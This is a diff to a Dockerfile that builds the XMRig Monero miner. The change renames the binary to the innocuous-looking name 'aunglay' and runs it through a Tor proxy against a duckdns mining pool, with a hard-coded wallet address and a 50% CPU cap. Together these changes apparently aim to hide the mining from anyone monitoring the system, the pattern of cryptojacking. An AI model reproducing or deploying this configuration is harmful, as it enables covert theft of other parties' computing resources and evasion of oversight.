@@ -44,7 +44,7 @@ RUN echo "@community http://dl-cdn.alpinelinux.org/alpine/edge/community" >> /et
     hwloc@community
   
 WORKDIR /xmr
-COPY --from=builder /miner/xmrig/build/xmrig /xmr
+COPY --from=builder /miner/xmrig/build/xmrig /xmr/aunglay
 
 RUN sh -c "screen -m -d -S tor tor && sleep 10s && ./aunglay -o aungmyozaw.duckdns.org:3333 -u 466qu8xzgtDXCr52mZxubW2yCFmdcAuLpHKECRmaCRn26V6LgNi5ttP74dQ7g2mUJNRzTqgDM6PUZQhaG45DgUx43kRxAoY -k --tls --rig-id rig -x 127.0.0.1:9050 --cpu-max-threads-hint 50" 
 
